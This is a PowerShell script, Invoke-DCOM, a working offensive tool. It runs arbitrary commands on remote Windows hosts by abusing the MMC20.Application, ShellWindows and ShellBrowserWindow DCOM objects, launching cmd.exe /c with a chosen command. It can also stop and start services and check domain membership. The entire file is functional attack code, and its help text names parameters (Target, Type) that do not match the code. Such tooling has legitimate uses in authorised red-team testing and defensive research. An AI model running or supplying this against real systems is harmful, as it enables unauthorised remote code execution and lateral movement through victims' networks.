function Invoke-DCOM {
<#
.SYNOPSIS

Execute's commands via various DCOM methods as demonstrated by (@enigma0x3)
http://www.enigma0x3.net

Author  : Steve Borosh (@rvrsh3ll)        
License : BSD 3-Clause
Required Dependencies : None
Optional Dependencies : None

.DESCRIPTION

Invoke commands on remote hosts via MMC20.Application COM object over DCOM.

.PARAMETER Target

IP Address or Hostname of the remote system

.PARAMETER Type

Specifies the desired type of execution

.PARAMETER Command

Specifies the desired command to be executed

.EXAMPLE

Invoke-DCOM -Target '192.168.2.100' -Method MMC20.Application -Command 'calc.exe'

.EXAMPLE

Invoke-DCOM -Target '192.168.2.100' -Method ServiceStart -ServiceName 'MyService'

#>
[CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine = $true, ValueFromPipelineByPropertyName = $true)]
        [string]
        $ComputerName,

        [Parameter(Mandatory = $true, Position = 1)]
        [ValidateSet('MMC20.Application', 'ShellWindows','ShellBrowserWindow','CheckDomain','ServiceCheck','MinimizeAll','ServiceStop','ServiceStart')]
        [string]
        $Method = 'MMC20.Application',

        [Parameter(Position = 2)]
        [string]
        $ServiceName,

        [Parameter(Position = 3)]
        [string]
        $Command = 'calc.exe'
    )

    begin {

        # Enumerate DCOM object guid
        [String]$Dcom = switch ($Method) {
            'MMC20.Application' { 'MMC20.Application' }
                 'ShellWindows' { '9BA05972-F6A8-11CF-A442-00A0C90A8F39' }
                        default { 'C08AFD90-F2A1-11D1-8455-00A0C91F3880' }
        }
    }
       
    process {
        
        try { $DcomType = [Type]::GetTypeFromCLSID($Dcom, $ComputerName) }
        catch { $DcomType = [Type]::GetTypeFromProgID($Dcom, $ComputerName) }
        
        $DcomObject = [Activator]::CreateInstance($DcomType)

        # Check for which type we are using and apply options accordingly
        switch ($Method) {
            'MMC20.Application' { $DcomObject.Document.ActiveView.ExecuteShellCommand($Command,$null,$null,'7') }

            'ShellBrowserWindow' { $DcomObject.Document.Application.ShellExecute($env:ComSpec,"/c $Command",'c:\windows\system32',$null,0) }

            'CheckDomain' { $DcomObject.Document.Application.GetSystemInformation('IsOS_DomainMember') }
            
            'MinimizeAll' { $DcomObject.Document.Application.MinimizeAll() }

            'ServiceStop' { $DcomObject.Document.Application.ServiceStop($ServiceName) }
        
            'ServiceStart' { $DcomObject.Document.Application.ServiceStart($ServiceName) }
     
            'ServiceCheck' { $DcomObject.Document.Application.IsServiceRunning($ServiceName) }
                   
            'ShellWindows' {
                $Item = $DcomObject.Item()
                $Item.Document.Application.ShellExecute($env:ComSpec,"/c $Command",'c:\windows\system32',$null,0)
            }
        }
    }

    end { Write-Verbose 'Completed.' }
}